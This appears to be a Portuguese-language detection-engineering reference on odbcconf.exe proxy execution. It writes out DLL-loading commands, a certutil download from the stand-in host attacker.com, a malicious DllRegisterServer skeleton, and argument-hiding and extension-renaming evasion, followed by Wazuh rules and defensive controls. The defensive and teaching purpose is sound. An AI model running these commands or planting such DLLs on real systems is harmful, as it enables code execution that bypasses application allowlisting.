# odbcconf.exe

**Plataforma:** Windows

**Categorias:** Execução de DLL, AWL Bypass, Defense Evasion

**MITRE ATT&CK:** T1218.008 (Signed Binary Proxy Execution — Odbcconf), T1574 (Hijack Execution Flow)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/

---

## O que é o odbcconf.exe

O odbcconf.exe é uma ferramenta de linha de comando nativa do Windows usada para configurar drivers ODBC (Open Database Connectivity) — a camada de abstração que permite que aplicações Windows se conectem a fontes de dados como SQL Server, MySQL, Oracle e outros bancos de dados via drivers padronizados. Está presente em todos os sistemas Windows desde o XP.

A ferramenta possui uma função chamada `REGSVR` que carrega e registra arquivos DLL de driver ODBC — e é exatamente essa funcionalidade que permite seu abuso para execução arbitrária de código.

---

## Por que atacantes usam o odbcconf

O odbcconf.exe é um binário assinado pela Microsoft e amplamente desconhecido por analistas de segurança. Sua função `REGSVR` é funcionalmente equivalente ao `regsvr32.exe` para fins de carregamento de DLL, mas é muito menos monitorada. Em ambientes com AppLocker ou WDAC configurados para bloquear `regsvr32.exe`, o odbcconf.exe frequentemente não está na lista de bloqueio, tornando-se uma rota alternativa direta.

Além disso, seu nome sugere operações de banco de dados, o que pode confundir analistas menos familiarizados com a técnica.

---

## Técnicas de abuso

### Carregamento de DLL maliciosa via REGSVR

A sintaxe básica:

```cmd
:: Carregar DLL maliciosa via REGSVR
odbcconf.exe /A {REGSVR C:\Windows\Temp\malicious.dll}

:: Alternativa com /S (modo silencioso, suprime diálogos de erro)
odbcconf.exe /S /A {REGSVR C:\Windows\Temp\payload.dll}

:: Via UNC path (DLL em servidor SMB do atacante)
odbcconf.exe /A {REGSVR \\attacker.com\share\payload.dll}
```

A DLL precisa exportar uma função `DllRegisterServer` (como qualquer DLL de COM/ActiveX). O código malicioso é executado quando essa função é chamada.

### Estrutura da DLL para abuso via odbcconf

```c
// DLL maliciosa básica para abuso via odbcconf/regsvr32
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Código executado quando a DLL é carregada — mas DllRegisterServer é o alvo
    }
    return TRUE;
}

// Função que odbcconf/regsvr32 chama
__declspec(dllexport) HRESULT __stdcall DllRegisterServer(void) {
    // Payload: reverse shell, download de stager, etc.
    WinExec("cmd.exe /c powershell -enc <base64_payload>", SW_HIDE);
    return S_OK;
}
```

### Uso com arquivo de resposta (rsp) para ofuscar argumentos

O odbcconf aceita um arquivo de resposta (semelhante ao uso de arquivos .inf com regsvr32):

```cmd
:: Criar arquivo de resposta
echo [ODBC] > C:\Windows\Temp\setup.rsp
echo REGSVR=C:\Windows\Temp\payload.dll >> C:\Windows\Temp\setup.rsp

:: Executar com arquivo de resposta
odbcconf.exe -f C:\Windows\Temp\setup.rsp
```

Esse método oculta a referência direta à DLL nos argumentos de linha de comando, complicando detecções baseadas em parsing de `commandLine`.

### Cadeia com download via certutil ou bitsadmin

```cmd
:: Baixar DLL maliciosa e registrar em sequência
certutil.exe -urlcache -f http://attacker.com/payload.dll C:\Windows\Temp\drv.dll
odbcconf.exe /S /A {REGSVR C:\Windows\Temp\drv.dll}
```

---

## Técnicas de bypass e evasão

### Renomear o arquivo de destino para extensão não suspeita

```cmd
:: Renomear a DLL para extensão não associada a código
copy payload.dll C:\Windows\Temp\setup.db
odbcconf.exe /A {REGSVR C:\Windows\Temp\setup.db}
```

O odbcconf carrega o arquivo independentemente da extensão, enquanto algumas ferramentas de segurança filtram apenas extensões .dll para inspeção.

### Usar DLL já presente no sistema (DLL sideloading)

Em vez de transferir uma DLL para o alvo, o atacante pode criar uma DLL com o mesmo nome de uma DLL legítima em um diretório de busca anterior ao sistema, fazendo com que o carregador do Windows encontre a versão maliciosa primeiro.

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- odbcconf.exe com argumento `REGSVR` — principal padrão de abuso
- odbcconf.exe executando DLL a partir de diretórios temporários ou de usuário
- odbcconf.exe com argumento `-f` seguido de arquivo fora de `%WINDIR%\System32\`
- odbcconf.exe gerando processos filhos (cmd.exe, powershell.exe, wscript.exe)
- odbcconf.exe executado por processo pai de documento Office ou navegador

**Indicadores de média relevância:**

- odbcconf.exe com caminho de DLL via UNC (\\servidor\)
- odbcconf.exe executado fora de janela de configuração de drivers de banco de dados

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0202-lolbas_awl_bypass.xml -->

<!-- odbcconf com REGSVR para execução de DLL -->
<rule id="100344" level="14">
  <if_group>sysmon</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)odbcconf\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)REGSVR</field>
  <description>odbcconf executando DLL via REGSVR — possivel AWL bypass ou execucao de codigo malicioso</description>
  <mitre>
    <id>T1218.008</id>
  </mitre>
</rule>

<!-- odbcconf carregando arquivo de diretório não padrão -->
<rule id="100345" level="13">
  <if_group>sysmon</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)odbcconf\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(\\Temp\\|\\Users\\|\\AppData\\|\\Downloads\\|\\Public\\)</field>
  <description>odbcconf referenciando arquivo em diretorio de usuario ou temporario — execucao suspeita de DLL</description>
  <mitre>
    <id>T1218.008</id>
  </mitre>
</rule>

<!-- odbcconf gerando processo filho suspeito -->
<rule id="100346" level="15">
  <if_group>sysmon</if_group>
  <field name="win.eventdata.parentImage" type="pcre2">(?i)odbcconf\.exe</field>
  <field name="win.eventdata.image" type="pcre2">(?i)(cmd|powershell|wscript|cscript|mshta|rundll32)\.exe</field>
  <description>odbcconf gerando processo filho — DLL maliciosa executou codigo via REGSVR</description>
  <mitre>
    <id>T1218.008</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Instalação e configuração de drivers ODBC:** o uso legítimo do odbcconf envolve argumentos como `CONFIGDSN`, `INSTALLDRIVER`, `REMOVEDRIVER` — não `REGSVR`. Qualquer ocorrência de `REGSVR` é incomum no uso legítimo.

**Instaladores corporativos:** alguns instaladores de software de banco de dados usam o odbcconf para registrar drivers durante a instalação. Esses eventos geralmente têm o processo pai como `msiexec.exe` ou um executável de instalador assinado, e ocorrem durante janelas de instalação conhecidas.

---

## Proteção e controles defensivos

**Bloquear odbcconf via AppLocker ou WDAC:** em ambientes que não precisam configurar drivers ODBC via linha de comando, o odbcconf.exe pode ser bloqueado por política. Isso é particularmente recomendado em estações de trabalho de usuários finais.

**Regra de ASR específica:** a Microsoft não tem uma regra ASR específica para odbcconf, mas a regra `d4f940ab-401b-4efc-aadc-ad5f3c50688a` (Block all Office applications from creating child processes) e políticas de WDAC cobrem casos de uso onde o odbcconf é invocado por documentos Office.

**Monitorar DllRegisterServer em DLLs não assinadas:** ferramentas de segurança que inspecionam a carga de DLLs podem detectar quando uma DLL sem assinatura válida exporta `DllRegisterServer` e é carregada por odbcconf ou regsvr32.

---

## Referências

- LOLBAS — odbcconf: https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/
- MITRE ATT&CK T1218.008: https://attack.mitre.org/techniques/T1218/008/
